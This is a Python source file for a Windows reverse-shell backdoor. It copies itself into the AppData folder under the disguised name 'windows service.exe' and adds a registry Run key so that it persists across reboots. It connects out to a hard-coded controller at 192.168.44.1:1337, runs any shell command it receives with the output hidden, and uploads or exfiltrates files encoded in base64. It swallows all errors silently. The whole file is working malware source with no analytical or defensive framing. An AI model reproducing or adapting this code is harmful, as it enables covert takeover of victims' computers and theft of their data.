#!/usr/bin/env python

import socket
import subprocess
import json
import os
import sys
import shutil
import base64

#PERSISTANT_WIN="reg add HKCU\Software\Microsoft\windows\currentversion\Run /v test /t REG_SZ /d C:\test.exe "

REG_ADD='reg add HKCU\Software\Microsoft\windows\currentversion\Run'
DEST_IP = "192.168.44.1"
DEST_PORT = 1337


class Backdoor:

    def __init__(self, DEST_IP, DEST_PORT):
        self.run_at_startup()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((DEST_IP, DEST_PORT))
    
    def send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)
    
    def recieve(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_commande(self, cmd):
            #redirect stdin and stderr
            DEVNULL = open(os.devnull,"wb")
            return subprocess.check_output(cmd, shell=True, stderr=DEVNULL, stdin=DEVNULL)

    def chdir(self, path):
        os.chdir(path)
        return "[+] Changing working directory to : " + path

    def read_file(self, path):
            with open(path, "rb") as file:
                return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful !"
   
    def run_at_startup(self):
        LOCATION = os.environ["appdata"]+"\\windows service.exe"
        if not os.path.exists(LOCATION):
            shutil.copyfile(sys.executable, LOCATION)
            subprocess.call(REG_ADD + ' /v "win service" /t REG_SZ /d "' + LOCATION + '"')

    def run(self):
        while True:
            cmd_out = ""
            cmd = self.recieve()
            try:
                if cmd[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif cmd[0] == "cd" and len(cmd) > 1:
                    cmd_out =  self.chdir(cmd[1]) 
                elif cmd[0] == "download":
                    cmd_out = self.read_file(cmd[1])
                elif cmd[0] == "upload" and len(cmd) > 2:
                    cmd_out = self.write_file(cmd[1],cmd[2])
                else:
                    cmd_out = self.execute_commande(cmd)
                
            except Exception as err:
                cmd_out = "[-] Error: "+str(err)

            self.send(cmd_out) 

try: 
    b = Backdoor(DEST_IP, DEST_PORT)
    b.run()
except Exception:
    sys.exit()

